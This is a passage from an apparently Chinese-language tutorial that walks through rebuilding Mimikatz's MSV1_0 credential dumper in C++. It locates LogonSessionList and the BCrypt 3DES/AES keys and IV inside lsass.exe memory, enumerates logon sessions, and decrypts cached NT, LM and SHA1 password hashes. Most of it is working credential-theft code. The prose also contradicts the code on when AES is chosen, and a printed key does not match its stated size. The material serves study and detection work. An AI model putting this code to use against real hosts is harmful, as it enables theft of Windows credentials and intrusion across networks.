			limit = (PBYTE)sBuffer.memoryRange.memoryAdress.address + sBuffer.memoryRange.size;
			for (CurrentPtr = (PBYTE)sBuffer.memoryRange.memoryAdress.address; !status && (CurrentPtr + Length <= limit); CurrentPtr++)
				status = RtlEqualMemory(Pattern, CurrentPtr, Length);
			CurrentPtr--;
			Search->result = (PBYTE)Search->memoryRange.memoryAdress.address + ((PBYTE)CurrentPtr - (PBYTE)sBuffer.memoryRange.memoryAdress.address);
		}
	}
	return status;
}
```

得到的特征码地址被赋值给 `Search->result`，然后返回 `LsaSearchGeneric()` 函数中开始定位 `LogonSessionList` 变量。

首先从 `currentReference` 中获取第一个偏移量加到特征码地址上，如下所示。

```c++
lsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off0;
```

这里得到 `lea rcx` 指令中保存 `LogonSessionList` 变量偏移量的四个字节序列的地址。然后通过 `ReadProcessMemory()` 函数获取这四个字节序列的值到 `offset` 中，此时 `offset` 中保存了 `LogonSessionList` 变量真正的偏移量。将 `sizeof(LONG)` 和 `offset` 加到 `rip` 指向的地址上即可得到 `LogonSessionList` 变量的地址，如下所示。

```c++
if (status = ReadProcessMemory(cLsass->hProcess, lsassMemory.address, &offset, sizeof(LONG), NULL))
{
	*genericPtr = ((PBYTE)lsassMemory.address + sizeof(LONG) + offset);
}
```

同理可以获得 `LogonSessionListCount` 变量的地址。

至此，成功得到 `LogonSessionList` 和  `LogonSessionListCount` 变量的地址，返回 `AcquireLSA()` 函数后，继续调用 `AcquireKeys()` 函数，该函数用于获取解密用户凭据的密钥。

### 2.1.5 提取 BCrypt 密钥和初始化向量

在 Windows 系统中，用户的登录凭据由 `LsaProtectMemory()` 函数调用后在内存中加密缓存，对 lsasrv.dll 逆向分析可以发现该函数实际上调用了 `LsaEncryptMemory()` 函数，如下图所示。

![image-20221218000404095](/assets/posts/2023-01-31-sekurlsa-how-to-dump-user-login-credentials-from-msv1_0/image-20221218000404095.png)

而 `LsaEncryptMemory()` 函数实际上封装了 `BCryptEncrypt()` 和 `BCryptDecrypt()` 函数，如下图所示，其中 `h3DesKey`、`hAesKey` 是加密用到的密钥对象的句柄，`InitializationVector` 是初始化向量。

![image-20221218000322792](/assets/posts/2023-01-31-sekurlsa-how-to-dump-user-login-credentials-from-msv1_0/image-20221218000322792.png)

`BCryptEncrypt()` 和 `BCryptDecrypt()` 是 [CNG](https://learn.microsoft.com/zh-cn/windows/win32/seccng/cng-portal)（Cryptography Next Generation）中的加密基元函数。CNG 即下一代加密技术，是 CryptoAPI 的替代物，其中提供了一套 API，可用来执行诸如创建、存储和检索加密密钥等基本的加密操作。

值得注意的是，在 `LsaEncryptMemory()` 函数种会根据待加密的数据块长度来选择对称加密算法，如果输入的缓冲区长度能被 8 整除，则会使用 AES 算法，否则就使用 3Des。此外 `LsaEncryptMemory()` 函数还提供了解密功能，为了解密用户凭据，我们需要获取初始化向量和密钥。

继续分析发现，有一个 `LsaInitializeProtectedMemory()` 函数对 `h3DesKey` 和 `hAesKey` 初始化，如下图所示。先由 `BCryptOpenAlgorithmProvider()` 函数加载并初始化 CNG 提供程序，并将初始化的句柄赋给 `h3DesProvider` 和 `h3AesProvider`。然后使用 `BCryptSetProperty()` 函数设置 CNG 对象的命名属性的值。

![image-20221230120956613](/assets/posts/2023-01-31-sekurlsa-how-to-dump-user-login-credentials-from-msv1_0/image-20221230120956613.png)

继续往下可以看到，系统会使用 `BCryptGenRandom()` 函数为密钥缓冲区生成随机数，这意味着每次 lsass.exe 启动时都会生成随机的新密钥。最后由 `BCryptGenerateSymmetricKey()` 函数根据随机生成的密钥缓冲区创建密钥对象，并将句柄赋给 `h3DesKey` 和 `hAesKey`，此句柄用于需要密钥的后续函数，例如 `BCryptEncrypt()` 等。

由于这个两个密钥句柄以及 `InitializationVector` 都是全局变量，因此可以使用 `rip` 相对寻址来定位他们的地址，跟前文中定位那两个全局变量的方法是一样的。获取到句柄后，再根据句柄与指针的关系获取到真正的密钥内容。

参考 Mimikatz，可以将常见系统版本的特征码保存在一个 `KeyReferences[]` 数组中，用来匹配引用 `InitializationVector`，`h3DesKey` 和 `hAesKey` 的指令，如下所示。

```c++
BYTE PTRN_WNO8_LsaInitializeProtectedMemory[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d };
BYTE PTRN_WIN8_LsaInitializeProtectedMemory[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d };
BYTE PTRN_WN10_LsaInitializeProtectedMemory[] = { 0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15 };
PATCH_GENERIC KeyReferences[] = { // InitializationVector, h3DesKey, hAesKey
	{WIN_BUILD_VISTA,	{sizeof(PTRN_WNO8_LsaInitializeProtectedMemory),	PTRN_WNO8_LsaInitializeProtectedMemory}, {0, NULL}, {63, -69, 25}},
	{WIN_BUILD_7,		{sizeof(PTRN_WNO8_LsaInitializeProtectedMemory),	PTRN_WNO8_LsaInitializeProtectedMemory}, {0, NULL}, {59, -61, 25}},
	{WIN_BUILD_8,		{sizeof(PTRN_WIN8_LsaInitializeProtectedMemory),	PTRN_WIN8_LsaInitializeProtectedMemory}, {0, NULL}, {62, -70, 23}},
	{WIN_BUILD_10_1507,	{sizeof(PTRN_WN10_LsaInitializeProtectedMemory),	PTRN_WN10_LsaInitializeProtectedMemory}, {0, NULL}, {61, -73, 16}},
	{WIN_BUILD_10_1809,	{sizeof(PTRN_WN10_LsaInitializeProtectedMemory),	PTRN_WN10_LsaInitializeProtectedMemory}, {0, NULL}, {67, -89, 16}},
};
```

以 Windows 10 x64 1903 系统为例，通过扫描下图红色边框标出的 `83 64 24 30 00 48 8d 45 e0 44 8b 4d d8 48 8d 15` 特征码，可以识别出 `lea rdx, ?h3DesKey`、`lea rdx, ?hAesKey` 和 `lea rdx, ?InitializationVector` 指令。在 x86_64 架构上，这些指令使用 `rip` 相对寻址来访问和使用全局变量，下图中的蓝色、绿色和黄色边框标出的字节序列，即为指令所保存的 `h3DesKey`、`hAesKey` 和 `InitializationVector` 相对于当前指令的偏移量（小端序）。

![image-20221218121056722](/assets/posts/2023-01-31-sekurlsa-how-to-dump-user-login-credentials-from-msv1_0/image-20221218121056722.png)

分别取出这四个字节中保存的偏移量值，加到 `rip` 指向的地址上即可分别得到 `h3DesKey`、`hAesKey` 和 `InitializationVector` 的地址，如下图所示。可以看到 `h3DesKey` 和 `hAesKey` 都是 `BCRYPT_KEY_HANDLE` 结构体。

![image-20221218121205349](/assets/posts/2023-01-31-sekurlsa-how-to-dump-user-login-credentials-from-msv1_0/image-20221218121205349.png)

下面开始编写 `AcquireKeys()` 函数，如下所示。其先通过与 `LsaSearchGeneric()` 函数相同的逻辑获取 `InitializationVector` 的地址，然后调用两次自定义函数 `AcquireKey()` 来定位 `h3DesKey` 和 `hAesKey` 的地址。

```c++
BOOL AcquireKeys(PLSA_CONTEXT cLsass, PPROCESS_VERY_BASIC_MODULE_INFORMATION pModuleInformation)
{
	BOOL status = FALSE;
	MEMORY_SEARCH sMemory = { {pModuleInformation->DllBase.address, pModuleInformation->SizeOfImage}, NULL };
	PPATCH_GENERIC currentReference;
	MEMORY_ADDRESS lsassMemory;
	LONG offset64;

	if (currentReference = GetGenericFromBuild(KeyReferences, ARRAYSIZE(KeyReferences), cLsass->osContext.BuildNumber))
	{
		if (MemorySearch(cLsass->hProcess, currentReference->Search.Pattern, currentReference->Search.Length, &sMemory))
		{
			lsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off0;
			if (ReadProcessMemory(cLsass->hProcess, lsassMemory.address, &offset64, sizeof(LONG), NULL))
			{
				lsassMemory.address = (PBYTE)lsassMemory.address + sizeof(LONG) + offset64;
				if (ReadProcessMemory(cLsass->hProcess, lsassMemory.address, &InitializationVector, sizeof(InitializationVector), NULL))
				{
					lsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off1;
					if (AcquireKey(&lsassMemory, cLsass, &k3Des))
					{
						lsassMemory.address = (PBYTE)sMemory.result + currentReference->Offsets.off2;
						if (AcquireKey(&lsassMemory, cLsass, &kAes))
						{
							status = TRUE;
						}
					}
				}
			}
		}
	}
	return status;
}
```

`AcquireKey()` 函数定义如下，用于获取 `h3DesKey` 和 `hAesKey` 的地址。这里以获取 `h3DesKey` 为例进行讲解，获取 `hAesKey` 的方法相同。

```c++
BOOL AcquireKey(PMEMORY_ADDRESS pLsassMemory, PLSA_CONTEXT cLsass, PBCRYPT_GEN_KEY pGenKey)
{
	BOOL status = FALSE;
	MEMORY_ADDRESS localMemory;
	BCRYPT_HANDLE_KEY hKey; PHARD_KEY pHardKey;
	PVOID buffer; 
	SIZE_T szkey;
	LONG offset;

	if (cLsass->osContext.BuildNumber < WIN_MIN_BUILD_8)
	{
		szkey = sizeof(BCRYPT_KEY);
		offset = FIELD_OFFSET(BCRYPT_KEY, hardkey);
	}
	else if (cLsass->osContext.BuildNumber < WIN_MIN_BUILD_BLUE)
	{
		szkey = sizeof(BCRYPT_KEY8);
		offset = FIELD_OFFSET(BCRYPT_KEY8, hardkey);
	}
	else
	{
		szkey = sizeof(BCRYPT_KEY81);
		offset = FIELD_OFFSET(BCRYPT_KEY81, hardkey);
	}

	if (buffer = LocalAlloc(LPTR, szkey))
	{
		LONG offset64;
		if (ReadProcessMemory(cLsass->hProcess, pLsassMemory->address, &offset64, sizeof(LONG), NULL))
		{
			pLsassMemory->address = (PBYTE)pLsassMemory->address + sizeof(LONG) + offset64;
			localMemory.address = &pLsassMemory->address;

			if (ReadProcessMemory(cLsass->hProcess, pLsassMemory->address, localMemory.address, sizeof(BCRYPT_KEY_HANDLE), NULL))
			{
				if (ReadProcessMemory(cLsass->hProcess, pLsassMemory->address, &hKey, sizeof(BCRYPT_HANDLE_KEY), NULL) && hKey.tag == 'UUUR')
				{
					if (ReadProcessMemory(cLsass->hProcess, hKey.key, buffer, szkey, NULL) && ((PBCRYPT_KEY)buffer)->tag == 'MSSK')
					{
						pHardKey = (PHARD_KEY)((PBYTE)buffer + offset);

						if (localMemory.address = LocalAlloc(LPTR, pHardKey->cbSecret))
						{
							pLsassMemory->address = (PBYTE)hKey.key + offset + FIELD_OFFSET(HARD_KEY, data);
							if (ReadProcessMemory(cLsass->hProcess, pLsassMemory->address, localMemory.address, pHardKey->cbSecret, NULL))
							{
								__try
								{
									status = NT_SUCCESS(BCryptGenerateSymmetricKey(pGenKey->hProvider, &pGenKey->hKey, pGenKey->pKey, pGenKey->cbKey, (PUCHAR)localMemory.address, pHardKey->cbSecret, 0));
								}
								__except (GetExceptionCode() == ERROR_DLL_NOT_FOUND) {}
							}
							LocalFree(localMemory.address);
						}
					}
				}
			}
		}
		LocalFree(buffer);
	}
	return status;
}
```

首先通过 `ReadProcessMemory()` 函数获取保存 `h3DesKey` 偏移量的那四个字节的值，并加到 `rip` 指令的地址上得到了 `h3DesKey` 变量的地址。然后再将 `h3DesKey` 指向的内存块复制到 `hKey` 指向的地址中。这里需要知道的 `h3DesKey` 变量是一个 `BCRYPT_KEY_HANDLE` 的句柄结构，由于句柄相当于指针的指针，因此该句柄中保存着存储密钥内容的那块内存的指针的指针，因此其指向密钥的指针结构，参考 Mimikatz 可以将这个指针结构定义如下。

```c++
typedef struct _BCRYPT_HANDLE_KEY {
	ULONG size;
	ULONG tag;	// 'UUUR'
	PVOID hAlgorithm;
	PBCRYPT_KEY key;
	PVOID unk0;
} BCRYPT_HANDLE_KEY, * PBCRYPT_HANDLE_KEY;
```

其中 `tag` 是该结构中不变的标签，这在 WinDBG 中可以看到，如下图所示。通过检查 `tag` 是否等于 ”UUUR“ ，可以确认当前找到的结构是否正确。

![image-20221218125311390](/assets/posts/2023-01-31-sekurlsa-how-to-dump-user-login-credentials-from-msv1_0/image-20221218125311390.png)

此外，`BCRYPT_HANDLE_KEY` 中的属性 `key` 是一个指向 `PBCRYPT_KEY` 的指针，根据 Mimikatz，该结构因系统版本而异。由于笔者的测试环境为 Windows 10 x64 1903，因此这使用的是 `BCRYPT_KEY81`，其定义如下。

```c++
typedef struct _BCRYPT_KEY81 {
	ULONG size;
	ULONG tag;	// 'MSSK'
	ULONG type;
	ULONG unk0;
	ULONG unk1;
	ULONG unk2;
	ULONG unk3;
	ULONG unk4;
	PVOID unk5;	// before, align in x64
	ULONG unk6;
	ULONG unk7;
	ULONG unk8;
	ULONG unk9;
	HARD_KEY hardkey;
} BCRYPT_KEY81, * PBCRYPT_KEY81;
```

其中 `tag` 是该结构中不变的标签，在上图所示中可以看到，在 `BCRYPT_HANDLE_KEY` 结构后面引用了 `BCRYPT_KEY81`。

此外 `BCRYPT_KEY81` 的最后一个成员 `hardkey` 是一个 `HARD_KEY` 结构体，该结构定义如下，其中的字节数组 `data[]` 保存了实际的密钥值，而 `cbSecret` 是 `data[]` 数组的大小。

```c++
typedef struct _HARD_KEY {
	ULONG cbSecret;
	BYTE data[ANYSIZE_ARRAY]; // etc...
} HARD_KEY, *PHARD_KEY;
```

我们可以使用 WinDBG 来提取这个密钥，如下所示：

![image-20221218125411580](/assets/posts/2023-01-31-sekurlsa-how-to-dump-user-login-credentials-from-msv1_0/image-20221218125411580.png)

这样我们就得到了`h3DesKey`，大小为`0x18`字节，包含如下数据：

```c++
dd 03 51 00 bc 78 57 2c 61 7d 74 ba 72 c2 d0 32 fe 01 e4 bc 34 39 be
```

我们可以通过相同的过程来提取 `hAesKey` 中的密钥：

![image-20221218125505598](/assets/posts/2023-01-31-sekurlsa-how-to-dump-user-login-credentials-from-msv1_0/image-20221218125505598.png)

最后再调用 `BCryptGenerateSymmetricKey()` 函数，通过已获取的密钥内容创建一个密钥对象，并由 `pGenKey->hKey` 接收得到的密钥句柄，用于后续的解密过程。

至此，成功得到解密用户登录凭据的密钥和初始化向量，整个 `AcquireLSA()` 函数调用结束，返回 `EnumerateLSA()` 函数后，将继续枚举用户会话信息。

## 2.2 枚举登录会话信息

### 2.2.1 遍历 LogonSessionList 双向链表

在前文中曾经提到过，`LogonSessionList` 是一个 `LIST_ENTRY` 结构体，因此它也是一个双向链表，可以使用 WinDBG 命令遍历浏览，如下图所示。

![image-20221218125559775](/assets/posts/2023-01-31-sekurlsa-how-to-dump-user-login-credentials-from-msv1_0/image-20221218125559775.png)

链表中的每个成员都指向了一个包含用户会话信息的结构体，具体结构因不同系统而异，在 Windows 10 x64 1903 系统中，参考 Mimikatz 可以对其定义如下。

```c++
typedef struct _MSV1_0_LIST_63 {
	struct _MSV1_0_LIST_63* Flink;	//off_2C5718
	struct _MSV1_0_LIST_63* Blink; //off_277380
	PVOID unk0; // unk_2C0AC8
	ULONG unk1; // 0FFFFFFFFh
	PVOID unk2; // 0
	ULONG unk3; // 0
	ULONG unk4; // 0
	ULONG unk5; // 0A0007D0h
	HANDLE hSemaphore6; // 0F9Ch
	PVOID unk7; // 0
	HANDLE hSemaphore8; // 0FB8h
	PVOID unk9; // 0
	PVOID unk10; // 0
	ULONG unk11; // 0
	ULONG unk12; // 0 
	PVOID unk13; // unk_2C0A28
	LUID LocallyUniqueIdentifier;
	LUID SecondaryLocallyUniqueIdentifier;
	BYTE waza[12]; /// to do (maybe align)
	LSA_UNICODE_STRING UserName;
	LSA_UNICODE_STRING Domaine;
	PVOID unk14;
	PVOID unk15;
	LSA_UNICODE_STRING Type;
	PSID  pSid;
	ULONG LogonType;
	PVOID unk18;
	ULONG Session;
	LARGE_INTEGER LogonTime; // autoalign x86
	LSA_UNICODE_STRING LogonServer;
	PMSV1_0_CREDENTIALS Credentials;
	PVOID unk19;
	PVOID unk20;
	PVOID unk21;
	ULONG unk22;
	ULONG unk23;
	ULONG unk24;
	ULONG unk25;
	ULONG unk26;
	PVOID unk27;
	PVOID unk28;
	PVOID unk29;
	PVOID CredentialManager;
} MSV1_0_LIST_63, * PMSV1_0_LIST_63;
```

可以看到，该结构里包含了用户名（UserName）、域名（Domaine）、登录时间（LogonTime）、凭据（Credentials）以及登录到的服务器（LogonServer）等信息。这里的 UserName、Domaine 和 LogonServer 都是 `LSA_UNICODE_STRING` 字符串，其结构定义如下，专用于各种本地安全机构函数用于指定 Unicode 字符串。

```c++
typedef struct _LSA_UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING;
```

其中 UserName 在结构中偏移量为 `0x90`，我们可以通过 WinDBG 遍历出所有的用户名，如下图所示。

![image-20221218125821684](/assets/posts/2023-01-31-sekurlsa-how-to-dump-user-login-credentials-from-msv1_0/image-20221218125821684.png)

同理在偏移量为 `0xF8` 处获取登录到的服务器名，如下图所示。

![image-20221218130142586](/assets/posts/2023-01-31-sekurlsa-how-to-dump-user-login-credentials-from-msv1_0/image-20221218130142586.png)

### 2.2.2 枚举用户信息

在 `EnumerateLSA()` 函数中定义了以下部分代码，用于枚举用户信息。

```c++
if (cLsass.osContext.BuildNumber < WIN_MIN_BUILD_2K3)
	helper = &lsassEnumHelpers[0];
else if (cLsass.osContext.BuildNumber < WIN_MIN_BUILD_VISTA)
	helper = &lsassEnumHelpers[1];
else if (cLsass.osContext.BuildNumber < WIN_MIN_BUILD_7)
	helper = &lsassEnumHelpers[2];
else if (cLsass.osContext.BuildNumber < WIN_MIN_BUILD_8)
	helper = &lsassEnumHelpers[3];
else if (cLsass.osContext.BuildNumber < WIN_MIN_BUILD_BLUE)
	helper = &lsassEnumHelpers[5];
else
	helper = &lsassEnumHelpers[6];

ReadProcessMemory(cLsass.hProcess, LogonSessionListCount, &nbListes, sizeof(ULONG), NULL);
for (i = 0; i < nbListes; i++)
{
	if (aBuffer.address = LocalAlloc(LPTR, helper->tailleStruct))
	{
		if (ReadProcessMemory(cLsass.hProcess, &LogonSessionList[i], &pStruct, sizeof(PVOID), NULL))
		{
			while (pStruct != &LogonSessionList[i])
			{
				if (ReadProcessMemory(cLsass.hProcess, pStruct, aBuffer.address, helper->tailleStruct, NULL))
				{
					sessionData.LogonId = (PLUID)((PBYTE)aBuffer.address + helper->offsetToLuid);
					sessionData.LogonType = *((PULONG)((PBYTE)aBuffer.address + helper->offsetToLogonType));
					sessionData.Session = *((PULONG)((PBYTE)aBuffer.address + helper->offsetToSession));
					sessionData.UserName = (PUNICODE_STRING)((PBYTE)aBuffer.address + helper->offsetToUsername);
					sessionData.LogonDomain = (PUNICODE_STRING)((PBYTE)aBuffer.address + helper->offsetToDomain);
					sessionData.pCredentials = *(PVOID*)((PBYTE)aBuffer.address + helper->offsetToCredentials);
					sessionData.pSid = *(PSID*)((PBYTE)aBuffer.address + helper->offsetToPSid);
					sessionData.pCredentialManager = *(PVOID*)((PBYTE)aBuffer.address + helper->offsetToCredentialManager);
					sessionData.LogonTime = *((PFILETIME)((PBYTE)aBuffer.address + helper->offsetToLogonTime));
					sessionData.LogonServer = (PUNICODE_STRING)((PBYTE)aBuffer.address + helper->offsetToLogonServer);

					GetUnicodeString(sessionData.UserName, cLsass.hProcess);
					GetUnicodeString(sessionData.LogonDomain, cLsass.hProcess);
					GetUnicodeString(sessionData.LogonServer, cLsass.hProcess);
					GetSid(&sessionData.pSid, cLsass.hProcess);

					LsaLogonData(&sessionData);

					// LocalFree...

					pStruct = ((PLIST_ENTRY)(aBuffer.address))->Flink;
				}
				else 
					break;
			}
		}
		LocalFree(aBuffer.address);
	}
}
```

这里先根据 `cLsass.osContext.BuildNumber` 中的系统版本，从 `lsassEnumHelpers[]` 数组中选择适合的成员。该数组中的每个成员都是 `LSA_ENUM_HELPER` 结构体，用于保存用户的各种信息在会话信息结构（例如前文中的 `MSV1_0_LIST_63`）中的偏移量，其定义如下。

```c++
typedef struct _LSA_ENUM_HELPER {
	SIZE_T tailleStruct;
	ULONG offsetToLuid;
	ULONG offsetToLogonType;
	ULONG offsetToSession;
	ULONG offsetToUsername;
	ULONG offsetToDomain;
	ULONG offsetToCredentials;
	ULONG offsetToPSid;
	ULONG offsetToCredentialManager;
	ULONG offsetToLogonTime;
	ULONG offsetToLogonServer;
} LSA_ENUM_HELPER, * PLSA_ENUM_HELPER;
```

在 Windows 10 x64 1903 系统中，使用的成员如下：

```c++
{sizeof(MSV1_0_LIST_63), FIELD_OFFSET(MSV1_0_LIST_63, LocallyUniqueIdentifier), FIELD_OFFSET(MSV1_0_LIST_63, LogonType), FIELD_OFFSET(MSV1_0_LIST_63, Session),	FIELD_OFFSET(MSV1_0_LIST_63, UserName), FIELD_OFFSET(MSV1_0_LIST_63, Domaine), FIELD_OFFSET(MSV1_0_LIST_63, Credentials), FIELD_OFFSET(MSV1_0_LIST_63, pSid), FIELD_OFFSET(MSV1_0_LIST_63, CredentialManager), FIELD_OFFSET(MSV1_0_LIST_63, LogonTime), FIELD_OFFSET(MSV1_0_LIST_63, LogonServer)}
```

然后通过遍历 `LogonSessionList` 依次得到用户名、域名、凭据、SID、登录时间以及登录到的服务器等信息，并将让它们临时保存在 `sessionData` 中，这是一个 `BASIC_SECURITY_LOGON_SESSION_DATA` 结构体，其定义如下。

```c++
typedef struct _BASIC_SECURITY_LOGON_SESSION_DATA {
	PLSA_CONTEXT	            cLsass;
	const LSA_LOCAL_HELPER*     lsassLocalHelper;
	PLUID						LogonId;
	PLSA_UNICODE_STRING			UserName;
	PLSA_UNICODE_STRING			LogonDomain;
	ULONG						LogonType;
	ULONG						Session;
	PVOID						pCredentials;
	PSID						pSid;
	PVOID						pCredentialManager;
	FILETIME					LogonTime;
	PLSA_UNICODE_STRING			LogonServer;
} BASIC_SECURITY_LOGON_SESSION_DATA, * PBASIC_SECURITY_LOGON_SESSION_DATA;
```

最后将 `&sessionData` 传入自定义函数 `LsaLogonData()` 打印登录信息。

# 3. 打印登录会话信息

编写 `LsaLogonData()` 函数，用于输出获取到的登录会话信息，定义如下。

```c++
BOOL LsaLogonData(PBASIC_SECURITY_LOGON_SESSION_DATA pSessionData)
{
	BOOL status = FALSE;
	if (pSessionData->LogonType != Network)
	{
		PrintLogonData(pSessionData);

		wprintf(L"\n[+] MSV1_0 Credential : ");
		if (Lsass_Msv1_0_Package.Module.isPresent && Lsass_Msv1_0_Package.isValid)
		{
			Msv1_0EnumerateCreds(pSessionData->pCredentials);
			wprintf(L"\n>>>>=================================================================\n");

		}
	}
	return status;
}
```

## 3.1 打印用户基本信息

 `LsaLogonData()` 内部调用自定义函数 `PrintLogonData()` ，用于来打印用户名、域名、登录的服务器、登陆时间以及 SID 等基本用户信息，如下所示。

```c++
void PrintLogonData(PBASIC_SECURITY_LOGON_SESSION_DATA pSessionData)
{
	const wchar_t* LSA_LOGON_TYPE[] = {
		L"UndefinedLogonType",
		L"Unknown !",
		L"Interactive",
		L"Network",
		L"Batch",
		L"Service",
		L"Proxy",
		L"Unlock",
		L"NetworkCleartext",
		L"NewCredentials",
		L"RemoteInteractive",
		L"CachedInteractive",
		L"CachedRemoteInteractive",
		L"CachedUnlock",
	};

	wprintf(
		L"[+] Session           : %s from %u\n"
		L"[+] User Name         : %wZ\n"
		L"[+] Domain            : %wZ\n"
		L"[+] Logon Server      : %wZ\n", 
		LSA_LOGON_TYPE[pSessionData->LogonType], 
		pSessionData->Session,   
		pSessionData->UserName,
		pSessionData->LogonDomain,
		pSessionData->LogonServer
	);

	wprintf(L"[+] Logon Time        : ");
	DisplayLocalFileTime(&pSessionData->LogonTime);
	wprintf(L"\n");
	wprintf(L"[+] SID               : ");
	if (pSessionData->pSid)
		DisplaySID(pSessionData->pSid);
}
```

返回 `LsaLogonData()` 函数后，继续调用 `Msv1_0EnumerateCreds()` 函数来处理用户凭据信息。

## 3.2 打印用户凭据信息

### 3.2.1 处理用户凭据结构

回顾前文，我们在枚举 `MSV1_0_LIST_63` 结构体时可知，凭据 `Credentials` 在该结构中的偏移量为 `0x108`，这是一个指向 `MSV1_0_CREDENTIALS` 结构体的指针，该结构定义如下。

```c++
typedef struct _MSV1_0_CREDENTIALS {
	struct _MSV1_0_CREDENTIALS* next;
	DWORD AuthenticationPackageId;
	PMSV1_0_PRIMARY_CREDENTIALS PrimaryCredentials;
} MSV1_0_CREDENTIALS, * PMSV1_0_CREDENTIALS;
```

`MSV1_0_CREDENTIALS` 结构的 `0x10` 偏移处的 `PrimaryCredentials` 是一个指向包含 `MSV1_0_PRIMARY_CREDENTIALS` 结构体的指针，该结构定义如下，用于保存主要凭据。

```c++
typedef struct _MSV1_0_PRIMARY_CREDENTIALS {
	struct _MSV1_0_PRIMARY_CREDENTIALS* next;
	ANSI_STRING Primary;    // 'Primary'
	LSA_UNICODE_STRING Credentials;
} MSV1_0_PRIMARY_CREDENTIALS, * PMSV1_0_PRIMARY_CREDENTIALS;
```

其中 `Primary` 的值是一个签名字符串 ”Primary“，类似于 `BCRYPT_HANDLE_KEY` 中的 `tag`，这可以在内存中看到，如下图所示。

![image-20221218130304106](/assets/posts/2023-01-31-sekurlsa-how-to-dump-user-login-credentials-from-msv1_0/image-20221218130304106.png)

而 `MSV1_0_PRIMARY_CREDENTIALS::Credentials` 中就保存了加密后的用户凭据，这是一个 `LSA_UNICODE_STRING` 字符串，其成员 `Buffer` 指向缓存凭据的加密内存，该内存解密后的结构因系统版本而异，参考 Mimikatz 可知在 Windows 10 x64 1903 系统中的结构如下。

```c++
typedef struct _MSV1_0_PRIMARY_CREDENTIAL_10_1607 {
	LSA_UNICODE_STRING LogonDomainName;
	LSA_UNICODE_STRING UserName;
	PVOID pNtlmCredIsoInProc;
	BOOLEAN isIso;
	BOOLEAN isNtOwfPassword;
	BOOLEAN isLmOwfPassword;
	BOOLEAN isShaOwPassword;
	BOOLEAN isDPAPIProtected;
	BYTE align0;
	BYTE align1;
	BYTE align2;
	DWORD unkD; // 1/2
#pragma pack(push, 2)
	WORD isoSize;  // 0000
	BYTE DPAPIProtected[LM_NTLM_HASH_LENGTH];
	DWORD align3; // 00000000
#pragma pack(pop) 
	BYTE NtOwfPassword[LM_NTLM_HASH_LENGTH];
	BYTE LmOwfPassword[LM_NTLM_HASH_LENGTH];
	BYTE ShaOwPassword[SHA_DIGEST_LENGTH];
	/* buffer */
} MSV1_0_PRIMARY_CREDENTIAL_10_1607, * PMSV1_0_PRIMARY_CREDENTIAL_10_1607;
```

其中 `NtOwfPassword`、`LmOwfPassword` 和 `ShaOwPassword` 这三个关键的字节序列分别存储了用户的 NT Hash、LM Hash 和 SHA1 散列值，三者在该结构中的偏移量分别是 `0x4A`、`0x5A` 和 `0x6A`。

下面开始编写 `Msv1_0EnumerateCreds()` 函数，定义如下。

```c++
BOOL Msv1_0EnumerateCreds(PVOID pCredentials)
{
	BOOL status = FALSE;
	MSV1_0_CREDENTIALS credentials;
	MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
	MEMORY_ADDRESS lsassMemory = { pCredentials };

	while (lsassMemory.address)
	{
		if (ReadProcessMemory(cLsass.hProcess, lsassMemory.address, &credentials, sizeof(MSV1_0_CREDENTIALS), NULL))
		{
			while (lsassMemory.address)
			{
				lsassMemory.address = credentials.PrimaryCredentials;
				while (lsassMemory.address)
				{
					if (ReadProcessMemory(cLsass.hProcess, lsassMemory.address, &primaryCredentials, sizeof(MSV1_0_PRIMARY_CREDENTIALS), NULL))
					{
						if (GetUnicodeString(&primaryCredentials.Credentials, cLsass.hProcess))
						{
							if (GetUnicodeString((PUNICODE_STRING)&primaryCredentials.Primary, cLsass.hProcess))
							{
								//wprintf(L"\n\t [%08x] %Z", credentials.AuthenticationPackageId, &primaryCredentials.Primary);
								Msv1_0CredsOutput((PGENERIC_PRIMARY_CREDENTIAL)&primaryCredentials.Credentials);
								status = TRUE;
								LocalFree(primaryCredentials.Primary.Buffer);
							}
							LocalFree(primaryCredentials.Credentials.Buffer);
						}
					}
					else
						wprintf(L"[-] MSV1_0_PRIMARY_CREDENTIALS No.");
					lsassMemory.address = primaryCredentials.next;
				}
			}
			lsassMemory.address = credentials.next;
		}
		else
			wprintf(L"[-] MSV1_0_CREDENTIALS No.");
	}
	return status;
}
```

在 `Msv1_0EnumerateCreds()` 函数中，经过几次 `ReadProcessMemory()` 调用后，成功获取到主要凭据，并将其传入自定义函数 `Msv1_0CredsOutput()`。

### 3.2.2 解密用户凭据内存

前文中曾提到，用户的登录凭据由 `LsaProtectMemory()` 函数调用后在内存中加密缓存，因此这里根据前文 “2.1.4 提取 BCrypt 密钥和初始化向量” 中的逆向结果编写了 `LsaUnprotectMemory()`  和 `LsaEncryptMemory()` 两个函数，用来对包含凭据的内存进行解密，如下所示。

```c++
BOOL LsaUnprotectMemory(PVOID Buffer, ULONG BufferSize)
{
	return LsaEncryptMemory((PUCHAR)Buffer, BufferSize, FALSE);
}


BOOL LsaEncryptMemory(PUCHAR pMemory, ULONG cbMemory, BOOL Encrypt)
{
	BOOL status = FALSE;
	BCRYPT_KEY_HANDLE* hKey;
	BYTE LocalInitializationVector[16];
	ULONG cbIV, cbResult;

	RtlCopyMemory(LocalInitializationVector, InitializationVector, sizeof(InitializationVector));
	if (cbMemory % 8)
	{
		hKey = &kAes.hKey;
		cbIV = sizeof(InitializationVector);
	}
	else
	{
		hKey = &k3Des.hKey;
		cbIV = sizeof(InitializationVector) / 2;
	}
	if(Encrypt)
		status = NT_SUCCESS(BCryptEncrypt(*hKey, pMemory, cbMemory, 0, LocalInitializationVector, cbIV, pMemory, cbMemory, &cbResult, 0));
	else
		status = NT_SUCCESS(BCryptDecrypt(*hKey, pMemory, cbMemory, 0, LocalInitializationVector, cbIV, pMemory, cbMemory, &cbResult, 0));

	return status;
}
```

